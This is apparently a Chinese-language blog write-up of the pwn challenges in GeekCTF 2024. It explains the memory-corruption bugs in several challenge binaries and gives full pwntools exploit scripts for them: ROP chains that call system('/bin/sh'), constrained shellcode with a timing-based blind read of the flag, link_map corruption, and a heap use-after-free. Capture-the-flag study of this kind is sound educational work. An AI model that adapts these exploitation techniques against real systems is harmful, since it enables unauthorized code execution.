---
title: Geekctf2024-wp
date: 2024-04-14 00:00:00
tags:
  - pwn
  - wp
excerpt: 出题之余想打打比赛复健一下，没想到题目质量出奇的高，最后pwn方向第二
---
# WriteUp for GeekCTF 2024



出题之余想打打比赛复健一下，没想到题目质量出奇的高，最后pwn方向第二

# memo0

换表base64，注意密文被动态解密过一次

# memo1

edit函数中读取v3类型为long long，随后与unsigned int idx进行有符号比较，最后转换为unsigned int 传入myread中。构造负数v3使其补码为想要的目标值即可达成栈溢出

```python
1-1*(~(len(payload) - 1)&0x7fffffffffffffff)
```

这里通过多次溢出到canary低位进行覆盖，即可泄露

# memo2

非常好的题目  
一眼可以看出要打ld相关的结构，该漏洞在sig函数。程序首先mmap了一块空间，sig函数对该空间的修改存在数组越界，而mmap分配的地址是相对偏移固定的，故我们可以修改到ld.so上的内容  
然而本题存在几个坑（我是踩坑大师）：

1. 该程序的tls在libc.so之前，也就是在可控地址之前，这里的v1看似可以写负数补码，但看汇编可以发现地址＋偏移的操作前，偏移经过了一次edx-> rdx的无符号扩展的转换。故无法打canary直接溢出
2. sig只能调用一次，随后调用`_exit`。`_exit`和`exit`的区别在于后者会调用一系列析构函数，前者则直接调用`syscall` ,导致基于fini, fini_array的一系列打法都无法实现
3. `strncpy`之后到调用`_exit`之前没有其他需要符号解析的函数，不能通过添加偏移误导dl_resolve向`_exit`的got表上写地址
4. ~~缺少足够可用的指针来伪造重定位表或者符号表~~，在sig之前不知道ld地址因而也无法在mmap区域里伪造表项

下面是正确解法：  
dl_reslove解析函数时，会根据函数的符号沿着所有link_map查找相应符号，对于`_exit`，会在libc中查找。这个查找的结果是libc的link_map -> l_addr 加上函数的偏移，而我们调试发现这个地址在ld附近，故我们可以通过更改l_addr，使`_exit`被错误解析到其他函数上  
不过这里即使错误解析`_exit`，也无法直接获得shell，并会在之后的return立即退出。还好我们还有一个栈溢出，通过覆盖canary，能够直接调用`stack_chk_fail`。如果我们错误解析这个函数，就能在避免canary错误退出的同时，获得一个可观的栈溢出  
exp如下：

```python
#!/usr/bin/env python3  
#-*- coding: utf-8 -*-  
from pwn import*  
import os  
  
context(os = 'linux', arch = 'amd64', log_level = 'debug', terminal = ['tmux', 'new-window'])  
  
def exp(host = "chall.geekctf.geekcon.top", port=40312, exe = "./memo2"):  
  global p  
  if len(sys.argv)==1:  
    p = remote("0.0.0.0", port)  
  else:  
    p = remote(host, port)  
  pass  
  
  offset = 0x160  
  libclinkmap = 0x2200  
  exit = 0xeac00  
  stack_chk_fail = 0x136550  
  write = 0x114870  
  poprdi = 0x000000000002a3e5  
  binsu = 0x001d8678  
  system = 0x50d70  
  ret = 0x00000000000f8c92  
  
  p.recvuntil(b"Please enter your password: ")  
  p.sendline(b"CTF_is_interesting_isn0t_it?")  
  
  p.recvuntil(b"Your choice:")  
  p.sendline(b"5")  
  p.recvuntil(b"Where would you like to sign(after the content): ")  
  p.sendline(str(libclinkmap+1).encode())  
  p.recvuntil(b"You will overwrite some content: ")  
  libc = p.recvn(5).rjust(6, b"\x00").ljust(8, b"\x00")  
  libc = u64(libc)  
  log.success(f"[*]libc: {hex(libc)}")  
  p.recvuntil(b"name: ")  
  payload = p64(libc + stack_chk_fail - exit)[1:] + p64(libc + 0x22c140) + b"\xc0"  
  payload = payload.ljust(0x28, b"\x90")  
  payload += p64(poprdi + libc) + p64(binsu + libc) + p64(ret + libc) +p64(system + libc)  
  p.send(payload)  
    
if __name__ == '__main__':  
	exp()  
	p.interactive()
```

另外，我本地跑出的libc的link_map的偏移与远端不同，我的解决方法是先泄露出相对偏移固定的ld.so的link_map，通过l_next找到相对固定的vdso的link_map，然后在远端泄露出libc的link_map，可以得到其固定的后两个hex为00，又已知mmap大小为0x2000，故直接从0x2000开始爆破0x100的位置即可，手动爆两次就成功了。

p.s. 后来学习了别人的博客，原来这题是可以伪造表项的，例如伪造strtab，只需让linkmap里的表项指向bss上指针的前一个地址。这应该是正解。我的解法似乎还没看到前人做过

# shellcode

很有新意的一道shellcode，只允许ow，要求偶数位byte为偶数，奇数位byte位奇数，且奇数不能超过0x80  
显然需要构造一个盲注，但是限制如此大的情况下很难直接读入，并且最大的难点在于`syscall`的机器码为`0f 05`，连续的两个奇数  
于是我们的思路转变为：先构造一个无限制的读入，而要达成这个读入，需要在运行过程中将某个读入的字节码转换为`0f 05`  
我的策略是先找到一个能改目标字节，且满足条件的指令，我选择的是


```assembly
sub [rsi + 0x11], bx   //66 29 5e 11
```


围绕这条指令和预先寄存器的设置编写read的shellcode如下

```assembly
xor rax,rax 
pop rbx
pop rdx
pop rbx 
push 1
nop
pop rbx
add rsi, rbx
pop rcx 
sub [rsi + 0x11], bx|
```

rsi本身指向数组，至于这里为什么先＋1，读者可以自行构造理解  
然后读入我们的盲注shellcode，这里懒得算偏移喷射了一些nop，最后exp如下

```python
from pwn import*  
import os  
  
context(os = 'linux', arch = 'amd64', log_level = 'info', terminal = ['tmux', 'new-window'])  
  
def debug(cmd = ''):  
	if len(sys.argv)!=1:  
		return  
	cmd += """  
	b main  
	bp 0x13d1  
	"""  
	gdb.attach(p, cmd)  
	pause()  
    
if __name__ == '__main__':  
  flag = "flag{practice_handwrite_shellcode}"  
  #flag{praatice_hand_rite_rhdkgco?e}  
  count = 1  
  for i in range (len(flag),0x40):  
    left = 0  
    right = 127  
    while left < right:  
        mid = (left + right)>>1  
        global p  
        p = remote("chall.geekctf.geekcon.top", 40245)  
        # p = process("./shellcode")  
  
        # shellcode = '''xor rax,rax  
        # pop rbx   
        # pop rdx   
        # pop rbx  
        # push 1   
        # nop  
        # pop rbx   
        # add rsi, rbx  
        # /* even */  
        # pop rcx  
        # sub [rsi + 0x11], bx   
        # /* odd */  
        # '''  
        p.recvuntil(b"Please input your shellcode:")  
        # pl = asm(shellcode) + b"\x10\x05\x90"  
        p.send(b"H1\xc0[Z[j\x01\x90[H\x01\xdeYf)^\x11\x10\x05\x90")  
  
        # payload = b"\x90" * 0x18  
        # payload += asm(shellcraft.open("./flag"))  
        # payload += asm(shellcraft.read(3, 'rsp', 0x80))  
        payload = b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8/.gm`f\x01\x01H1\x04$H\x89\xe71\xd21\xf6j\x02X\x0f\x051\xc0j\x03_1\xd2\xb2\x80H\x89\xe6\x0f\x05"  
        # print(payload)  
        shellcode = f'''  
        mov dl,byte ptr [rsp+{i}]  
        mov cl,{mid}  
        cmp dl,cl  
        ja loop  
        mov al,0x1  
        syscall  
        loop:  
        xor rax, rax  
        mov rdi, 0  
        mov rsi, rsp  
        mov rdx, 0x80  
        syscall  
        '''  
        payload += asm(shellcode)  
        sleep(4)  
        try:  
          p.sendline(payload)  
            
          start_time = time.time()  
          p.clean(2)  
          start_time = time.time() - start_time  
  
        except:  
          pass  
        else:  
          if start_time > 2:  
            left = mid +1  
            p.close()     
          else:            
            right = mid  
            p.close()  
        info(f"time-->{count}")  
        count += 1  
    flag += chr(left)  
    info(flag)  
    if flag[-1]=="}":  
        break
```

btw由于网络环境太差，灵敏度已经调很低的情况下爆出来依旧有瑕疵，最后还得靠人脑自动补全（

# stkbof

鉴定为：前戏太久，还没开始做我就已经干了

hexagon的简单栈溢出，难点在于搭环境XD  
逆向可以选择ida的python插件/ldd插件/ghidra插件，调试据说可以用高通的sdk，但是由于高通的勾使网站根本下不下来，后面采用了一些比较tricky的方式。直接运行会报错缺少ld文件，搜索得知这个ld就是给出的libc的一个软链接

需要先了解hexagon的指令集和栈结构，和arm比较相似。另外，aslr是没有的，所以我们只需事先泄露出栈地址，libc地址，就能一直使用。至于这里为什么要泄露栈地址，因为不存在pop/push，取值的操作都是基于fp的偏移进行的，也就意味着每次覆盖的fp都会成为下一次的栈帧，所以需要控制fp

不使用调试器泄露fp的一种方法是手动patch文件，直接patch出输出fp或者相关量的指令，很炫酷，需要对指令集有所理解；另一种是使用qemu的调试功能

```shell
qemu-hexagon -L libc -d in_asm,exec,cpu -dfilter 0x20400+0xc0 -strace -D /tmp/log ./chall
```

exp如下

```python
#!/usr/bin/env python3  
#-*- coding: utf-8 -*-  
from pwn import*  
import os  
  
context(os = 'linux', arch = 'i386', log_level = 'debug', terminal = ['tmux', 'new-window'])  
  
def debug(cmd = ''):  
	if len(sys.argv)!=1:  
		return  
	cmd += """  
	"""  
	gdb.attach(p, cmd)  
	pause()  
  
libcbase = 0x40810000  
gadget = 0x000204B4  
binsu = libcbase + 0x0012279  
system = libcbase + 0x000BB920  
fp = 0x4080fce0  
fp += 0x100  
  
def exp(host = "chall.geekctf.geekcon.top", port=18081, exe = "./memo1"):  
  global p  
  p = remote(host, port)  
  p.send(b'CONNECT rbxgkrrv782pg9y9:1 HTTP/1.0\r\n\r\n')  
  p.recvline()  
  
  pass  
  p.recvuntil("Do you know \"stack buffer overflow\"?\n")  
  # 0x4080fd10  
  payload = (p32(0)*2 + p32(binsu) + p32(0xffffffff) + p32(fp + 0x200) + p32(system)).ljust(0x100, b"\x90") + p32(fp - 0xf0) + p32(gadget)  
  p.send(payload)  
  
if __name__ == '__main__':  
	exp()  
	p.interactive()
```

# cppgame

最佳题目，趣味和挑战性并存，并告诉玩家不当观批就不会打pwn的深刻道理  
第一，我不玩塔

题目就是文字版的《杀戮尖塔》，稍微了解C++即可发现漏洞点在于Card类没有拷贝构造函数，在拷贝时会发生浅拷贝，如果调用其中一个对象的析构函数，就会留下悬空指针

虽然源码中没有写出，但手动fuzz并查阅汇编后发现dispaly函数的结尾会delete card并调用析构函数，由于前面发生了浅拷贝，这里会使得原先card的description实际已经释放但仍然可以访问

另外一个漏洞点在于display函数(又是你)输出name是以null作为截断的，如果将name填满，自然会输出之后的description指针，从而达成堆地址的泄露

这两个漏洞组合之后，我们可以改tcache fd从而任意地址分配，也可以double free构造指向同一块内存的指针，再结合vector保存在堆上的指针，我们可以在堆上七进七出了。但最大的问题是，我们只有堆的地址，而保存在堆上的只有卡牌对象。玩家，怪物这些对象全部保存在bss上，导致很难达成一刀999的效果。怪物1337血，还每两回合攻击力翻倍，不开挂，我怎么玩？

在我一筹莫展之际，向身边的塔批朋友分享了我的处境，随后的十分钟里，观者玩家的智慧以一种粗暴的方式射进了我的大脑：你不是能改卡组吗，先这样，再那样，然后你就能转起来了。

我：？？？

改牌的方式操作起来不难，由于description的大小刚好是0x80，与vector扩容两次之后的大小一致，构造一个double free并随后让vector和description指向同一个地方，然后在一次修改操作里同时完成泄露地址、伪造卡牌和伪造指针的过程。为了节约空间我把卡牌压缩在了一起，现在想来由于type是32位大小，其实还有压缩的空间。  
开挂的exp如下：

```python
from pwn import*  
import os  
  
context(os = 'linux', arch = 'i386', log_level = 'info', terminal = ['tmux', 'new-window'])  
  
def debug(cmd = ''):  
	if len(sys.argv)!=1:  
		return  
	cmd += """  
	b main  
	bp 0x2a2d  
	"""  
	gdb.attach(p, cmd)  
	pause()  
  
def menu():  
  p.recvuntil(b"Your choice:")  
  
def buy(idx):  
  menu()  
  p.sendline(b"1")  
  p.recvuntil(b"which card do you want to buy?\n")  
  p.sendline(str(idx).encode())  
  
def upgrade(idx):  
  menu()  
  p.sendline(b"2")  
  p.recvuntil(b"Input card index:\n")  
  p.sendline(str(idx).encode())  
  p.recvuntil("Your new card name:\n")  
  p.send(b"\x90" * 0x10)  
  p.recvuntil(b"\x90" * 0x10)  
  leak = u64(p.recvn(6).ljust(8, b"\x00"))  
  heapbase = leak - 0x120a0  
  log.success(hex(leak))  
  log.success(hex(heapbase))  
  p.recvuntil(b":\n")  
  payload = p64(leak + 0x50)*2 + p64(leak + 0x58)*2 + p64(leak + 0x60)*7  
  payload = payload.ljust(11, b"\x00") + b"V".ljust(0x8, b"\x00") + b"R".ljust(0x8, b"\x00")  
  payload += p64(3) + p64(4) + p64(5)  
  p.send(payload)  
  
def display(idx):  
  menu()  
  p.sendline(b"3")  
  p.recvuntil(b"Input card index:\n")  
  p.sendline(str(idx).encode())  
  p.recvuntil(b"Card description:")  
  
def exp(host = "chall.geekctf.geekcon.top", port=40304, exe = "./game"):  
  global p  
  if len(sys.argv)==1:  
    p = process(exe)  
  else:  
    p = remote(host, port)  
  pass  
  
  for i in range(4):  
    buy(1)  
  for i in range(4):  
    display(i+1)  
  
  buy(1)  
  buy(1)  
  buy(1)  
  display(3)  
  upgrade(3)
```

然后我召唤了塔批上号展示操作  
此时我手里有11张牌，其中2张暴怒，2张平静，7张猛虎下山（牌型分布参考专家意见）。他开局先是把手里的猛虎下山全部丢掉，同时一直挨打，但是猛虎下山快丢完的时刻出现了转机：由于猛虎下山使用之后不放入弃牌堆，现在牌堆里只有暴怒和平静。因为使用了猛虎下山，每次（平静时）使用暴怒都会获得两张牌，获得两点能量，并对怪物造成伤害，随后使用平静刷新状态。由于手牌有3张，牌库总共4张，故每次手牌中都至少存在一张暴怒和一张平静，而每打完这两张牌，就会因为暴怒重新获得2张牌和2点能量，也就是没有任何损耗。如果一直交替出这两张牌，就能在一回合之内无限连下去，直到击碎神明！

代练脚本如下：

```python
if __name__ == '__main__':  
  exp()  
  p.sendlineafter(b"choice: ", b"6")  
  calm = False  
  while True:  
    p.recvuntil(b"hand:")  
    p.recvline()  
  
    cards = []  
    res = b''  
    for i in range(3):  
      res = p.recvline().strip()  
      log.info(f"Card: {res}")  
  
      if res[0] in [49, 50, 51]:  
         res = res.split(b" ")[-1]  
      else:  
         break  
        
      if (res == b"V" or res == b"R"):  
        cards.append(res.decode())  
      else:  
        cards.append("N")  
        
    log.info(f"Hand: {cards}")  
  
    if not b'-' in res:  
      p.recvline()  
  
    info = p.recvuntil(b'-', drop=True)  
    log.info(f"Your Info: \n{info.decode()}")  
  
    p.recvline()  
  
    info = p.recvuntil(b'-', drop=True)  
    log.info(f"Monster: \n{info.decode()}")  
    moster_hp = int(info.split(b"HP: ")[-1].split(b"M")[0].strip())  
  
    log.info("Calm" if calm else "Wrath")  
    log.info(f"Monster HP: {moster_hp}")  
  
    p.recvuntil(b"turn):")  
  
    if "R" in cards:  
      p.sendline(str(cards.index("R") + 1).encode())  
    else:  
      if not "N" in cards:  
        calm = False  
      if not "V" in cards:  
        calm = True  
  
      if calm:  
        p.sendline(str(cards.index("N") + 1).encode())  
        if moster_hp < 8:  
           break  
        calm = False  
      else:  
        p.sendline(str(cards.index("V") + 1).encode())  
        calm = True  
  
  log.success("来玩杀戮尖塔谢谢喵~")  
  p.sendline(b"cat flag")  
  p.interactive()
```

很酷